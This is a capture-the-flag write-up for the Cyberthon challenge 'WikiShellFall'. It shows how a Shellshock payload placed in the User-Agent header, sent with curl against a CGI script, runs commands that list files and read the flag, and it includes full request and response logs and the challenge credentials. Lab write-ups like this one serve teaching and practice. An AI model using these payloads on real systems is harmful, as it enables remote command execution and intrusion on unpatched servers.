# WikiShellFall

### Web Services // 1500 Points // 0 Solves

*This challenge was solved after Cyberthon ended.*

*This writeup is incomplete. More information is needed and may be added.*

## Solution

Upon looking at this challenge, my first thought was that the solution would be a known exploit, because the page was using a framework. Hint 3 ("What is significant about bash, and the date?") was what told me that it was [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)). This was confirmed with a CSIT engineer (I was unsure since the date was _before_ the Shellshock vulnerability was discovered. I guess the narrative is that the server wasn't updated since then, leaving it exposed since Shellshock was undiscovered for three years).

Firstly, to get the easy stuff out of the way:

* Username: `Baba Ali` (from the frontpage: "This is the personal wiki of Baba Ali")
* Password: `Ek6OaGHk8ZRP3.wI` (comment in the source code of the front page)

### Bewildered Bash

[This page](http://garage4hackers.com/showthread.php?t=6902) and [this page](https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/) were almost basic Shellshock guides. If a request with any header with the contents of the Shellshock payload is sent, an arbitrary command can be run:

```
curl --user 'Baba Ali:Ek6OaGHk8ZRP3.wI' -A '() { :;}; echo "Flag:" $(/bin/bash -c "cat flag")' -v http://p7ju6oidw6ayykt9zeglwyxired60yct.ctf.sg:11345/cgi/minisleep.cgi
```

* `--user 'Baba Ali:Ek6OaGHk8ZRP3.wI'`: sets the authentication, since auth is handled by Nginx (i.e. CGI won't be run if Nginx doesn't allow it to)
* `-A '() { :;}; echo "Flag:" $(/bin/bash -c "cat flag")'`: sets the user agent (an HTTP header) to the Shellshock payload
	* The payload returns (in a header) the output of the command in the brackets, formatted properly
	* `/bin/bash -c` executes the following command. For some reason, just using `$()` results in `An error occurred while parsing CGI reply` being replied. Further investigations are needed. `/bin/sh` works as well.
* `-v`: verbose. Makes `curl` print the headers

The payload will be printed in the headers for an unknown reason. I believe that this is because there's a separator between the headers and the body being sent by CGI, but I'm not too sure. This writeup may be updated in the future with additional information. What this _means_, however, is that we must prepend "something: " in front of the output to make this a valid HTTP response header, so that Nginx doesn't freak out (you may get a `An error occurred while reading CGI reply (no response received)` error).

_input from [@JakeIsMeh](https://github.com/JakeIsMeh):_
This is only possible because the organizers moved their backend back to Bash. From the docs page:
> 2019-08-18: Version 1.10 (latest)  
> Changed the codebase from bash to POSIX sh.  No longer requires bash.
In the modified `minisleep.cgi`, however, it still uses Bash.

The output of an `ls` was odd, because each separator corresponded to a new HTTP header, leading to this weird result:

```
$ curl --user 'Baba Ali:Ek6OaGHk8ZRP3.wI' -A '() { :;}; echo "res:" $(/bin/bash -c "ls")' -v http://p7ju6oidw6ayykt9zeglwyxired60yct.ctf.sg:11345/cgi/min
isleep.cgi

< HTTP/1.1 400
< Server: nginx
< Date: Sun, 03 May 2020 14:33:50 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive

# Important bits below
< res: add-attributes.xsl
< buildpage.sh:
< flag:
< minisleep.cgi:
< rebuild_all_pages.sh:
...
```

After doing this, we can `cat` the flag:

```
$ curl --user 'Baba Ali:Ek6OaGHk8ZRP3.wI' -A '() { :;}; echo "Flag:" $(/bin/bash -c "cat flag")' -v http://p7ju6oidw6ayykt9zeglwyxired60yct.ctf.sg:11345/cgi/minisleep.cgi
*   Trying 128.199.134.10...
* TCP_NODELAY set
* Connected to p7ju6oidw6ayykt9zeglwyxired60yct.ctf.sg (128.199.134.10) port 11345 (#0)
* Server auth using Basic with user 'Baba Ali'
> GET /cgi/minisleep.cgi HTTP/1.1
> Host: p7ju6oidw6ayykt9zeglwyxired60yct.ctf.sg:11345
> Authorization: Basic QmFiYSBBbGk6RWs2T2FHSGs4WlJQMy53SQ==
> User-Agent: () { :;}; echo "Flag:" $(/bin/bash -c "cat flag")
> Accept: */*
>
< HTTP/1.1 400
< Server: nginx
< Date: Sun, 03 May 2020 14:40:49 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
< Flag: Cyberthon{update-y0ur-systemz-8W.wqDei}
...
```

## Flag

```
Cyberthon{update-y0ur-systemz-8W.wqDei}
```

## Takeaways

Oh are there many.

1. If everyone is exploiting Shellshock through the User Agent, don't look into how the CGI script works
2. Point 1, except when it's obvious that there aren't any environment variables to exploit anyways, obviously
3. Don't give up if something doesn't work on the first try (we did 1, because we didn't know we had to format the response as a header in the beginning)
4. High point challenges can actually have simple solutions as well (we did not expect the password to be in a commend for a looong while)
5. ~~Firefox is surprisingly good at things it's not meant for~~
